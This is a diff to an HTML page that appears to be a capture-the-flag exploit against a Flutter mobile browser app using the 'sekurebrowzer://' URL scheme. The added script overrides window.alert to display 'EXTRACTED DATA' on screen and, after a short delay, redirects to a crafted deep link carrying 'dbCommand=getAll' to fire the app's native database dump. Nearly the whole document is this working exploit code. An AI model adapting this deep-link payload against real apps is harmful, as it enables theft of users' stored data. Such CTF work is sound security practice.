@@ -5,19 +5,44 @@
     <style>
         body { font-family: sans-serif; padding: 20px; background: #f4f4f9; }
         .box { background: white; padding: 20px; border-radius: 8px; border: 1px solid #ccc; }
-        button { padding: 10px 20px; font-size: 16px; cursor: pointer; }
+        #exploit-status { font-weight: bold; color: #333; }
     </style>
 </head>
 <body>
     <h1>Internal Resource Access</h1> 
     
     <div class="box">
-        <p id="status">Attempt to trigger local resource...</p>
-        <a href="sekurebrowzer://localhost" id="exploit-link">Click to try access Localhost</a>
+        <p id="exploit-status">Initializing exploit chain...</p>
     </div>
 
     <script>
-      
+        // 1. Override the native alert() function to bypass WKWebView blocking
+        window.alert = function(message) {
+            console.log("Alert intercepted: " + message);
+            
+            let alertBox = document.createElement('div');
+            alertBox.style.position = 'fixed';
+            alertBox.style.top = '10px';
+            alertBox.style.left = '10px';
+            alertBox.style.right = '10px';
+            alertBox.style.backgroundColor = '#ffeb3b';
+            alertBox.style.padding = '20px';
+            alertBox.style.border = '2px solid #f44336';
+            alertBox.style.zIndex = '9999';
+            alertBox.style.fontSize = '20px';
+            alertBox.style.borderRadius = '5px';
+            alertBox.textContent = "EXTRACTED DATA: " + message;
+            
+            document.body.appendChild(alertBox);
+        };
+
+        // 2. Automatically trigger the database dump after a short delay
+        setTimeout(() => {
+            document.getElementById('exploit-status').innerText = "Firing database extraction payload...";
+            
+            // This URL triggers the native 'getAll' branch in the Flutter app
+            window.location.href = 'sekurebrowzer://https://yahoo.com?url=https://vini2001.github.io/ctf/index.html&dbCommand=getAll';
+        }, 1500);
     </script>
 </body>
 </html>
